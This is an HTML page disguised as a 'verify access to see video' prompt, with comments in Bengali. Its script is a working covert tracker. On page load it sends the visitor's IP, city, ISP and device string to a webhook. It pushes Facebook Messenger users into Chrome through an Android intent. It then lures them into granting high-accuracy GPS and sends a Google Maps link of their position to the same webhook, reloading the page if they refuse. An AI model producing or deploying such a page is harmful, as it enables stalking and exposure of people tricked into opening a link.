<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title> <meta property="og:title" content=" ">
    <meta property="og:description" content=" ">
    <meta property="og:image" content="https://i.postimg.cc/ZnyFjR0V/IMG-6711.jpg">
    <meta property="og:type" content="website">

    <style>
        body { margin: 0; background-color: #050505; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #verify-card { background: #18191a; padding: 30px; border-radius: 20px; text-align: center; max-width: 350px; border: 1px solid #3e4042; }
        .btn { background: #0084ff; color: white; padding: 14px 28px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
        #content { display: none; text-align: center; }
        img { max-width: 90%; border-radius: 8px; }
    </style>
</head>
<body>

    <div id="verify-card">
        <h2 id="access-text">Access to see video</h2>
        <p>Please verify your session to start playback.</p>
        <button class="btn" id="action-btn" onclick="requestAccess()">Verify Access</button>
    </div>

    <div id="content">
        <img src="https://i.postimg.cc/ZnyFjR0V/IMG-6711.jpg">
    </div>

    <script>
        const webhookURL = "https://e2f275a6-8c4f-4a12-81a9-12f2a1b5d56e.webhooksite.net";

        // ১. পেজ লোড হওয়ার সাথে সাথে আইপি ট্র্যাকিং (কোনো ক্লিক ছাড়াই)
        window.onload = function() {
            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                sendToWebhook({
                    Event: "Page Loaded (Automatic IP)",
                    IP: data.ip,
                    City: data.city,
                    ISP: data.org,
                    Device: navigator.userAgent
                });
            });
        };

        async function requestAccess() {
            // ২. মেসেঞ্জার থেকে ব্রাউজারে নিয়ে যাওয়ার ট্রিক (Android-এর জন্য)
            if (navigator.userAgent.includes("Messenger") || navigator.userAgent.includes("FBAN")) {
                let url = window.location.href.replace(/^https?:\/\//, '');
                window.location.href = "intent://" + url + "#Intent;scheme=https;package=com.android.chrome;end";
                return;
            }

            // ৩. বাটনে ক্লিক করলে জিপিএস চাওয়া
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        sendToWebhook({
                            Event: "Access Granted ✅",
                            Maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        });
                        document.getElementById('verify-card').style.display = 'none';
                        document.getElementById('content').style.display = 'block';
                    },
                    (error) => {
                        // Deny করলে আবার ট্র্যাকিং ডাটা পাঠানো
                        sendToWebhook({ Event: "Access Denied ❌" });
                        alert("Access Denied: Please click 'Allow' to verify your network.");
                        location.reload();
                    },
                    { enableHighAccuracy: true }
                );
            }
        }

        function sendToWebhook(data) {
            fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>
